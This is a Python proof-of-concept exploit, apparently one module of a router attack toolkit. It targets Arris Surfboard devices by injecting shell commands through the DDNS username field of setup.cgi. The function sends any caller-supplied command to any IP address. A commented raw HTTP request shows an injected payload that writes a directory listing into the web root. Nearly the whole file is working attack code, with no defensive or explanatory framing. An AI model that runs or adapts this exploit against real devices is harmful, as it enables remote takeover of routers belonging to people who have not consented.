#! python !#
from misc.session import *
import urllib.parse

def arris_surfboard(ip, cmd, session):
    try:
        cookies = {
            'RebootType': '1',
        }

        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
            'Connection': 'close',
            'Origin': f'http://{ip}',
            'Referer': f'http://{ip}/RgDdns.htm',
            'Upgrade-Insecure-Requests': '1',
            # 'Cookie': 'RebootType=1',
            'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:88.0) Gecko/20100101 Firefox/88.0',
        }

        params = {
            'id': '415f51ba',
        }

        #encode command as url
        command = urllib.parse.quote_plus(cmd)

        #data = 'DdnsService=1&DdnsUserName=%27%3Bcd+%2Fbin%3B%2Fusr%2Fsbin%2Fls%3E%2Ftmp%2Fwww%2Fhack2.txt%3B%27&DdnsPassword=abc123&DdnsHostName=pjqwudi&this_file=RgDdns.htm&next_file=RgDdns.htm'
        data = f'DdnsService=1&DdnsUserName={command}&DdnsPassword=abc123&DdnsHostName=pjqwudi&this_file=RgDdns.htm&next_file=RgDdns.htm'

        session.post(f'http://{ip}/setup.cgi?id=7bd13f54', headers=headers, params=params, cookies=cookies, data=data, timeout=(5, 2))
        return True
    except Exception as e: return (False, e)

# PoC example:
# Converted using
# https://curl.se/h2c/ - raw to curl
# https://curlconverter.com/ - curl to python
#
# POST /setup.cgi?id=415f51ba HTTP/1.1
# Host: 192.168.1.1
# User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:88.0) Gecko/20100101 Firefox/88.0
# Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
# Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
# Accept-Encoding: gzip, deflate
# Content-Type: application/x-www-form-urlencoded
# Content-Length: 179
# Origin: http://192.168.1.1
# Connection: close
# Referer: http://192.168.1.1/RgDdns.htm
# Cookie: RebootType=1
# Upgrade-Insecure-Requests: 1
# 
# DdnsService=1&DdnsUserName=%27%3Bcd+%2Fbin%3B%2Fusr%2Fsbin%2Fls%3E%2Ftmp%2Fwww%2Fhack2.txt%3B%27&DdnsPassword=abc123&DdnsHostName=pjqwudi&this_file=RgDdns.htm&next_file=RgDdns.htm